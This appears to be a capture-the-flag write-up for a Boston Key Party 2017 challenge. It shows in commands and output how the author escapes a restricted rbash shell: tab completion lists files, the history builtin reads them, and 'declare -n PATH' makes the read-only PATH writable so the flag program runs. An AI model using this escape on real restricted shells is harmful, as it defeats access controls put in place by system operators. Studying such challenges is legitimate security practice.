---
layout: post
title: "Boston Key Party 2017: Solitary Confinement (pwn 99)"
author: f0rki
categories: writeup
tags: [cat/pwn, tool/rbash]
---

* **Category:** pwn
* **Points:** 99

## Write-up

We can ssh into a machine that provides us with `rbash` a restricted version of
the `bash` shell. 

```
-rbash-4.3$ pwd
/
```

If we try to `ls` or `pwd` it will fail. It turns out there are no commands
available except for the bash builtins. We can get a list of available commands
by using bash autocompletion.

```
rbash-4.3$ [tab]
!          ]]         builtin    compgen    declare    echo       eval       fc         getopts    in         logout     pwd        readonly   shopt      time       typeset    until
./         alias      caller     complete   dirs       elif       exec       fg         hash       jobs       mapfile    return     source     times      ulimit     wait
:          bg         case       compopt    disown     else       exit       fi         help       kill       popd       rbash      select     suspend    trap       umask      while
[          bind       cd         continue   do         enable     export     for        history    let        printf     read       set        test       true       unalias    {
[[         break      command    coproc     done       esac       false      function   if         local      pushd      readarray  shift      then       type       unset      }
```

Well that's not a lot... So what are we supposed to do? We don't have `ls` so
we need to find another way. Again bash autocompletion to the rescue:

```
-rbash-4.3$ *[tab]
bin    dev    flag   lib    lib64  
-rbash-4.3$ */*[tab]
bin/rbash                   flag/showFlag               lib/x86_64-linux-gnu        lib64/ld-linux-x86-64.so.2  
-rbash-4.3$ */*/*[tab]
lib/x86_64-linux-gnu/libc.so.6
```

This way we get a list of all executable programs. To get a list of files we
can use again the autocompletion for the first argument of a program.

```
-rbash-4.3$ bin/rbash[tab]
.bash_login    .bash_logout   .bash_profile  .bashrc        .profile       bin/           dev/           flag/          lib/           lib64/   
-rbash-4.3$ rbash dev/[tab]
null  zero  
-rbash-4.3$ rbash lib/x86_64-linux-gnu/lib[tab]
libc.so.6      libdl.so.2     libtinfo.so.5  
```

So the goal will be to run the `flag/showFlag` command. Unfortunately `rbash`

* does not allow us to change directories
* does not allow us to use `/` in command names

So next thing is that we tried to read the `showFlag` program. A small trick to
read files using only bash builtins:

```sh
function r() { history -c; export HISTSIZE=0; export HISTSIZE=10000; history -r $1; history; }
```

Unfortunately we didn't have permissions to read the executable. So somehow
need to find a way to bypass the restrictions of `rbash`. A obvious target is
the `PATH` environment variable. Unfortunately `rbash` sets it as readonly:

```
rbash-4.3$ unset -v PATH
rbash: unset: PATH: cannot unset: readonly variable
```

Then we noticed that we can declare the `PATH` variable for example as an
integer or array:

```
-rbash-4.3$ declare -i PATH
-rbash-4.3$ export
...
declare -irx PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games"
```

We tried to declare it as integer with `-i`, as array `-a` and associative
array `-A` and checked whether we could somehow modify `PATH`. This didn't give
results. Then we noticed that `bash` can declare variables as "name references"

```
-rbash-4.3$ help declare
[...]
    -n	make NAME a reference to the variable named by its value
```

We then declared `PATH` as a reference and played around. We noticed that we
can suddenly write to the `PATH` variable:

```
rbash-4.3$ declare -n PATH
rbash-4.3$ export PATH=/flag
rbash-4.3$ export
declare -x /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games="/flag"
declare -x HOME="/home/ctfuser"
declare -x LANG="en_US.UTF-8"
declare -x LOGNAME="ctfuser"
declare -x MAIL="/var/mail/ctfuser"
declare -x OLDPWD
declare -nrx PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games"
declare -x PWD="/"
declare -rx SHELL="/bin/rbash"
declare -x SHLVL="2"
declare -x SSH_CLIENT="129.27.229.25 40454 22"
declare -x SSH_CONNECTION="129.27.229.25 40454 10.0.0.51 22"
declare -x SSH_TTY="/dev/pts/44"
declare -x TERM="xterm-256color"
declare -x USER="ctfuser"
declare -x XDG_RUNTIME_DIR="/run/user/1001"
declare -x XDG_SESSION_ID="618"
rbash-4.3$ echo $PATH
/flag
rbash-4.3$ showFlag
BKP{vimjail_is_down,_fortunately_we_have_rbash_to_save_the_day}
```

Bash is weird...
